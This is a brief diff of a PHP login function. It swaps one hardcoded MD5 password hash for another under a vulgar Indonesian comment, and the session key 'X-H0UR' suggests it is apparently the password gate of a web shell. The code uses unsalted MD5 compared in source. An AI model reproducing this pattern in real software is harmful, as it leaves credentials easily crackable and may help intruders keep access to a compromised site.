@@ -9,7 +9,7 @@ function is_logged_in() {
 
 // Fungsi untuk memvalidasi login
 function login($password) {
-    $valid_password_hash = 'de12f5798f86bdcc5c759a645e913e4c'; // MD5 hash password
+    $valid_password_hash = 'c296c1aa535b0bba6ccf85d8f9e7afff'; // Has Kentod
     $password_hash = md5($password);
     if ($password_hash === $valid_password_hash) {
         $_SESSION['X-H0UR'] = 'user';
